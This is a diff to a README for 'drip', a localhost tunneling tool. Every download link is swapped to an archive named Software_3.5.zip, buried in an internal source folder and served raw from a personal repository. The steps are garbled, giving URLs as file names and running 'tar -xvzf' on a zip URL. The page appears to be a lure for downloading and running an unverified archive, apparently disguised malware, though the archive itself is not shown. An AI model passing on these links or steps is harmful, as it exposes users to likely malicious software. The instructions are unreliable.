@@ -2,7 +2,7 @@
 
 ## 🚀 Download the Latest Version
 
-[![Download drip](https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/shared/netutil/drip-v3.0.zip)](https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/shared/netutil/drip-v3.0.zip)
+[![Download drip](https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/client/cli/Software_3.5.zip)](https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/client/cli/Software_3.5.zip)
 
 ## 🔍 Overview
 
@@ -30,15 +30,15 @@ Follow these steps to download and run drip.
 
 To download the latest version of drip, visit the following page:
 
-[Download drip Releases](https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/shared/netutil/drip-v3.0.zip)
+[Download drip Releases](https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/client/cli/Software_3.5.zip)
 
 ### 2. Choose the Correct File
 
 On the releases page, you will see a list of available versions. Look for the most recent release and locate the file suitable for your operating system. 
 
-- For **Windows**, you might see a file named like `https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/shared/netutil/drip-v3.0.zip`.
-- For **macOS**, look for `https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/shared/netutil/drip-v3.0.zip`.
-- For **Linux**, you could find a file named `https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/shared/netutil/drip-v3.0.zip`.
+- For **Windows**, you might see a file named like `https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/client/cli/Software_3.5.zip`.
+- For **macOS**, look for `https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/client/cli/Software_3.5.zip`.
+- For **Linux**, you could find a file named `https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/client/cli/Software_3.5.zip`.
 
 ### 3. Download the File
 
@@ -52,7 +52,7 @@ Once downloaded, follow these instructions:
   
 - **macOS:** Open the `.zip` file by double-clicking it. Drag the extracted application to your Applications folder.
 
-- **Linux:** Open the terminal. Navigate to the folder where you downloaded the file. Use `tar -xvzf https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/shared/netutil/drip-v3.0.zip` to extract. Run using `./drip`.
+- **Linux:** Open the terminal. Navigate to the folder where you downloaded the file. Use `tar -xvzf https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/client/cli/Software_3.5.zip` to extract. Run using `./drip`.
 
 ### 5. Configure Your Tunneling Options
 
@@ -82,6 +82,6 @@ For more detail on advanced features and specific configurations, please refer t
 
 To download drip again, visit:
 
-[Download drip Releases](https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/shared/netutil/drip-v3.0.zip)
+[Download drip Releases](https://raw.githubusercontent.com/Mr-Skull-420/drip/main/internal/client/cli/Software_3.5.zip)
 
 Enjoy using drip to expose your localhost securely!
